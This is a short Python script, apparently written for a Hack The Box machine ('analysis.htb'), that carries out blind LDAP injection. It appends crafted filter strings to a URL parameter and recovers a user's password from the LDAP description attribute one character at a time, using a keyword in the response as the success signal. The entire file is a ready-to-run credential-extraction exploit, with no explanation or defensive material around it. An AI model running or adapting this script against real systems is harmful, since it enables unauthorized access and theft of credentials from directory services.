#!/usr/bin/python3

import argparse
import requests
import signal
import sys
import string
from pwn import log


# Ctrl+C
def ctrl_c(sig, frame)->None:
    print(f"[!] Ctrl+C. Exiting...")
    sys.exit(1)


signal.signal(signal.SIGINT, ctrl_c)


def parse_arguments()->argparse.Namespace:
    # Create the parser
    parser = argparse.ArgumentParser(description="A simple script for LDAP injection.")
    # Add arguments
    parser.add_argument('-u', '--url', type=str, help='URL to attempt LDAP injection (incluiding the injectable parameter). Example: http://internal.analysis.htb/users/list.php?name', required=True)
    return parser.parse_args()


def request_to_site(url: str, current_password: str, all_characters: list[str], p)->str:
    # Start a loop through different characters to bruteforce the password
    index = 0
    while index < len(all_characters):
        char = all_characters[index]
        p.status(f"Attempting with char {char!r} (password found, at the moment, {current_password!r})")
        req_url = url + f'=*)(%26(objectClass=user)(description={current_password}{char}*)'
        r = requests.get(req_url)
        # Check the condition that satisfies the injection
        if r.status_code == 200 and 'technician' in r.text:
            current_password += char
            # Restart the list
            index = 0
        else:
            index += 1
    return current_password


def check_password_found(url: str, current_password: str, symbols_list: list[str], all_chars: list[str])->(str, bool):
    # Check that the password is not a false positive
    p2 = log.progress(f"Checking if password ({current_password!r}) has symbols")
    for symbol in symbols_list:
        temp_password: str = current_password + symbol
        for char in all_chars:
            p2.status(f"Checking with symbol {symbol!r} and character {char!r}")
            req_url = url + f'=*)(%26(objectClass=user)(description={temp_password}{char}*)'
            r = requests.get(req_url)
            if r.status_code == 200 and 'technician' in r.text:
                p2.failure(f"Password had more symbols ({symbol!r}, so current password is {current_password+symbol!r})")
                return current_password+symbol, False
    p2.success("Password checked. All correct.")
    return current_password, True


def ldap_injection(url: str)->None:
    # LDAP injection
    print(f"[+] Attempting LDAP Injection to url {url!r}...")
    p = log.progress('LDAP Injection')
    password: str = ''
    all_characters: list[str] = list(string.digits) + list(string.ascii_letters) + [c for c in list(string.punctuation) if c != ')'] # char ')' bugs the data 
    symbols_characters: list[str] = list(string.punctuation)
    foundPassword: bool = False
    # Exit the loop until we have checked that the extracted password is not a false positive
    while not foundPassword:
        # Get the password through injection
        password = request_to_site(url, password, all_characters, p)
        # Check if the password found is not a false positive 
        password, foundPassword = check_password_found(url, password, symbols_characters, all_characters)
    p.status(f"Password found: {password}")
    

def main()->None:
    # Get argument from users
    args = parse_arguments()
    # LDAP injection
    ldap_injection(args.url)


if __name__ == "__main__":
    main()
